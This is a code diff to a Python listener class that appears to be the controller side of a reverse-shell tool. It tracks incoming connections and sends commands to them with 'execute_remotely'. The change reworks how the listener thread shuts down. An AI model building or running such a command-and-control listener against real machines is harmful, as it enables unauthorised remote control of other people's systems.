@@ -24,21 +24,18 @@ class Listener:
 
 		self.chosen_connection = None
 
-		self.do_listen = True
-
 		print("[+] Waiting for incoming connections")
 
 
 	def listen(self):
-		if self.do_listen:
-			try:
-				self.listener.listen(0)
-				connection, address = self.listener.accept()
-				print("\n[+] Got a connection from " + str(address))
-				print("# Press Enter")
-				self.connections.append((connection, address))
-				self.listen()
-			except: pass
+		try:
+			self.listener.listen(0)
+			connection, address = self.listener.accept()
+			print("\n[+] Got a connection from " + str(address))
+			print("# Press Enter")
+			self.connections.append((connection, address))
+			self.listen()
+		except: pass
 
 
 	def reliable_send(self, data):
@@ -86,9 +83,10 @@ class Listener:
 		return self.connections
 
 
-	def close(self):
-		self.do_listen = False
-		self.listener.accept()
+	def exit(self):
+		connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		connection.connect((IP, PORT))
+
 		self.listener.close()
 
 
@@ -140,7 +138,7 @@ class Listener:
 
 
 			elif command == "exit":
-				# self.close()
+				self.exit()
 				if self.chosen_connection:
 					res = self.execute_remotely("exit")
 				break
@@ -182,3 +180,5 @@ if __name__ == "__main__":
 	listen_thread.start()
 
 	listener.run()
+	listen_thread.join()
+	listener.listener.close()
